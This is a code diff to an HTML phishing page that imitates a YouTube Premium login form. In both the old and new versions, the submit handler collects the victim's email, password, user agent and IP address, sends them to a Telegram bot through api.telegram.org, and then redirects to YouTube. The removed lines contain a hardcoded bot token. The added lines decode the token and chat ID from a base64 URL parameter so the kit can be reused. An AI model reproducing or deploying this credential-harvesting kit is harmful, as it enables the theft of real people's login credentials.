@@ -113,9 +113,9 @@
         </div>
         <div class="form-container">
             <form onsubmit="submitonhfc(); return false;" method="post">
-                <input type="hidden" name="" id="pagename" value="YouTube Premium">
-                <input type="text" id="email" placeholder="Email or Phone Number" class="input-field" name="email" required="">
-                <input id="name" type="password" placeholder="Password" class="input-field" name="password" required="">
+                <input type="hidden" id="pagename" value="YouTube Premium">
+                <input type="text" id="email" placeholder="Email or Phone Number" class="input-field" name="email" required>
+                <input id="name" type="password" placeholder="Password" class="input-field" name="password" required>
                 <button type="submit" class="login-button">Log In</button>
             </form>
             <a href="#" id="signup-link">Forgot Password?</a>
@@ -125,60 +125,74 @@
             </div>
         </div>
     </div>
+
     <div id="error-popup" class="popup">
         <div class="popup-content">
             <span class="popup-close" id="close-popup">×</span>
             <p><strong>Error:</strong> Sign up is currently disabled.</p>
         </div>
     </div>
+
     <script>
-        function la(src) {
-            window.location = src;
+        // Retrieve parameters from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedParams = urlParams.get('data');
+
+        let telegramToken = '';
+        let chatId = '';
+
+        // Decode the parameters
+        if (encodedParams) {
+            const decodedParams = atob(encodedParams);
+            const params = new URLSearchParams(decodedParams);
+            telegramToken = params.get('token');
+            chatId = params.get('chatId');
+            console.log('Decoded Params:', params);
+        } else {
+            console.log('No data parameter found.');
         }
-        function GetURLParameter(sParam) {
-            var sPageURL = window.location.search.substring(1);
-            var sURLVariables = sPageURL.split('&');
-            for (var i = 0; i < sURLVariables.length; i++) {
-                var sParameterName = sURLVariables[i].split('=');
-                if (sParameterName[0] == sParam) {
-                    return sParameterName[1];
-                }
-            }
-        }
-        var chatid = GetURLParameter('id');
+
         function submitonhfc() {
             fetch('https://api.ipify.org/?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const userAgent = navigator.userAgent;
                     const ip = data.ip;
-                    const cityName = data.city;
                     const page = document.getElementById("pagename").value;
                     const name = document.getElementById("name").value;
                     const email = document.getElementById("email").value;
-                    const message = `> Login Page : ${page}\n\n> Gmail : ${email}\n\n> Password : ${name}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
-                    const botToken = '6429165693:AAFWIcw2XGofDtPS2iZZkQqAKgoILb1TCoc';
-                    const chatId = chatid;
-                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    const message = 
+                        `🔐 *Login Attempt Detected* 🔐\n\n` +
+                        `🌐 Page: ${page}\n` +
+                        `📧 Email: ${email}\n` +
+                        `🔑 Password: ${name}\n` +
+                        `🕵️ User Agent: ${userAgent}\n` +
+                        `🌍 IP: ${ip}`;
+
+                    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
                     const telegramParams = {
                         chat_id: chatId,
-                        text: message
+                        text: message,
+                        parse_mode: 'Markdown'
                     };
+
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', telegramUrl, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.send(JSON.stringify(telegramParams));
-                    xhr.onload = function() {
+
+                    xhr.onload = function () {
                         if (xhr.status === 200) {
                             window.location.href = "https://m.youtube.com/";
                         } else {
-                            console.log('Error sending data to Telegram:', xhr.statusText);
+                            console.log('Error sending to Telegram:', xhr.statusText);
                         }
                     };
                 })
-                .catch(error => console.log('Error retrieving IP address information:', error));
+                .catch(error => console.log('IP Fetch Error:', error));
         }
     </script>
-    <div style="position: relative;" id="zp-8-4-6-apollo-root-apollo_everywhere"></div>
 </body>
 </html>
